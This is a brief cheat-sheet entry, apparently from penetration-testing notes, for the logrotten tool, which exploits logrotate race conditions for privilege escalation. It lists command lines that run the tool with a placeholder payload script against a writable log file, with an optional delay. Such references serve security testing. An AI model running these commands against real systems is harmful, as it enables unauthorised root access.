---
tool: logrotten
category: linux-tool
tags: linux tool logrotten logrotate privilege-escalation
---

# logrotten

logrotten targets logrotate race conditions when a writable log path is rotated by a privileged logrotate job.

## Linux

### Check version

#sh #logrotten

Print logrotten usage and options.

```sh title:"Print logrotten help"
./logrotten -h
```
<!-- cheat -->

### Run against log path

#sh #logrotten #logrotate

Run logrotten with a prepared payload script against a writable log path.

```sh title:"Run logrotten against writable log"
./logrotten -p "$payload_script" "$log_file"
```
<!-- cheat
var payload_script
var log_file
-->

### Run with sleep window

#sh #logrotten #logrotate

Run logrotten with a custom sleep delay.

```sh title:"Run logrotten with delay"
./logrotten -s "$sleep_seconds" -p "$payload_script" "$log_file"
```
<!-- cheat
var sleep_seconds
var payload_script
var log_file
-->
